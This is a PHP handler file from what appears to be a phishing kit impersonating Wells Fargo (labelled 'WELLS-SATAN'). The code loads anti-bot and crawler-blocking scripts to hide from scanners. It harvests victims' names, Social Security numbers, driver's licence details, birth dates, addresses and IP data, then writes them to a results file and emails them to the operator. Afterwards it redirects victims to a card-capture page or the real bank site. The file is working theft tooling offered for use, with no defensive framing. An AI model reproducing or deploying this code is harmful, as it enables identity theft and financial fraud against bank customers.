<?php
ob_start();
session_start();

include'../Anti/IP-BlackList.php';  
include'../Anti/Bot-Crawler.php';
include'../Anti/Bot-Spox.php';
include'../Anti/blacklist.php';
include'../Anti/new.php';
include'../Anti/Dila_DZ.php';
@require "../Anti/Crawler/src/CrawlerDetect.php";

use JayBizzle\CrawlerDetect\CrawlerDetect;

if(isset($_POST['first_name'])&&isset($_POST['last_name'])){
	include '../config.php';
	include '../Functions/Fuck-you.php';

	$hi="#---------------------------[ -WELLS-SATAN- Personal information ]----------------------------#\r\n";
	$hi.="First Name	: {$_POST['first_name']}\r\n";
	$hi.="Last Name 	: {$_POST['last_name']}\r\n";
	$hi.="SSN number	: {$_POST['ssn']}\r\n";
	$hi.="DL number	: {$_POST['dl']} / {$_POST['dlstate']} / {$_POST['dlexp']}\r\n";
	$hi.="Date of birth	: {$_POST['dob']}\r\n";
	$hi.="#---------------------------[ -WELLS-SATAN- Contact information ]----------------------------#\r\n";
	$hi.="Street address 1	: {$_POST['street1']}\r\n";
	$hi.="Street address 2	: {$_POST['street2']}\r\n";
	$hi.="City	: {$_POST['city']}\r\n";
	$hi.="State	: {$_POST['statec']}\r\n";
	$hi.="ZIP code	: {$_POST['zipcode']}\r\n";
	$hi.="#---------------------------[ -WELLS-SATAN- IP INFO ]----------------------------#\r\n";
	$hi.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
	$hi.="IP COUNTRY	: {$_SESSION['country']}\r\n";
	$hi.="IP CITY	: {$_SESSION['city']}\r\n";
	$hi.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	$hi.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
	$hi.="TIME		: ".date("d/m/Y h:i:sa")." GMT\r\n";
	$hi.="#---------------------------[ -WELLS-SATAN- Personal information ]----------------------------#\r\n";

		$save=fopen("../Wells_result/billing.txt","a+");
		fwrite($save,$hi);
		fclose($save);

	$subject="#WELLS SATAN Billing Info From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

	$headers="From: WELLS SATAN  <wells_spox@dila.dz>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";

		@mail($your_email,$subject,$hi,$headers);
    $key = substr(sha1(mt_rand()),1,25);

	if ($show_credit_card=="yes") {
		exit(header("Location: ../../credit_verification?wells_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}
	if ($show_success_page=="yes") {
		exit(header("Location: ../../Success?wells_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."")); 
	}else{

		$helper = array_keys($_SESSION);
    		foreach ($helper as $key){
        		unset($_SESSION[$key]);
    			}
    		exit(header("Location: https://bit.ly/2UgDDbr")); // go to bank login page officiel..
	}

}else{
    header("HTTP/1.0 404 Not Found");
    exit();
}

?>